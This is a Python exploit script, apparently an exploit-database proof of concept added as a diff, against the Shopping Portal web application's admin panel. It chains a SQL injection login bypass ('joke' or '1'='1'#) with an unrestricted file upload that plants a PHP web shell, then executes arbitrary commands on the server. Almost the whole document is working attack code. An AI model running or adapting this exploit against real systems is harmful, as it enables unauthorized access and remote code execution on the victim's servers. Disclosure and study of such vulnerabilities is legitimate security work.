@@ -1,0 +1,79 @@
+# Exploit Title: Shopping Portal ProVersion 3.0 - Authentication Bypass
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/shopping-portal-free-download/
+# Version: v4.0
+# Category: Webapps
+# Tested on: Xampp for Windows
+
+# Description:
+# Password and username parameters have sql injection vulnerability on admin panel.
+# username: joke' or '1'='1'# , password: joke' or '1'='1'#
+# Also, there isn't any restriction for malicious file uploading in the "Insert Product" section.
+# This two vulnerabilities occur unauthenticated remote command execution.
+
+#!/usr/bin/python
+
+import requests
+import sys
+import urllib                          
+
+if (len(sys.argv) !=3) or sys.argv[1] == "-h":
+	print "[*] Usage: PoC.py rhost/rpath command"
+	print "[*] e.g.: PoC.py 127.0.0.1/shopping ipconfig"
+	exit(0) 
+
+rhost = sys.argv[1]
+
+command = sys.argv[2]
+
+
+
+url = "http://"+rhost+"/admin/index.php"
+data = {"username": "joke' or '1'='1'#", "password": "joke' or '1'='1'#", "submit": ""}
+
+with requests.Session() as session:
+	#login
+
+	lg = login = session.post(url, data=data, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+	print ("[*] Status code for login: %s"%lg.status_code)
+	if lg.status_code != 200:
+		print ("One bad day! Check web application path!")
+		sys.exit()
+
+	#upload file
+
+	files = {'productimage1': ('command.php', '<?php system($_GET["cmd"]); ?>'), 'productimage2': ('joke.txt', 'joke'), 'productimage3': ('joke.txt', 'joke')}
+	fdata = {"category": "3", "subcategory": "8", "productName": "the killing joke", "productCompany": "blah", "productpricebd": "0", "productprice": "0", "productDescription": "blah<br>", "productShippingcharge": "0", "productAvailability": "In Stock", "productimage1": "command.php", "productimage2": "joke.txt", "productimage3": "joke.txt", "submit": ""}
+	
+	furl = "http://"+rhost+"/admin/insert-product.php"
+	fupload = session.post(url=furl, files=files, data=fdata)
+	print ("[*] Status code for file uploading: %s"%fupload.status_code)
+	
+	if fupload.status_code != 200:
+		print ("One bad day! File didn't upload.")
+		sys.exit()
+	dir = 0
+	dirr = str(dir)
+	
+	#find uploaded file
+
+	while True:
+		el = eurl = session.get("http://"+rhost+"/admin/productimages/"+dirr+"/command.php")	
+
+		if el.status_code == 200:
+			
+			print "File Found!"
+			print "Put On A Happy Face!\r\n\r\n"
+
+			print ("uploaded file location: http://%s/admin/prductimages/%s/command.php?id=%s"%(rhost,dirr,command))
+			break
+		else:			
+			print "trying to find uploaded file..."
+
+		dir += 1
+		dirr = str(dir)
+
+#exec
+final=session.get("http://"+rhost+"/admin/productimages/"+dirr+"/command.php?cmd="+command)
+print final.text
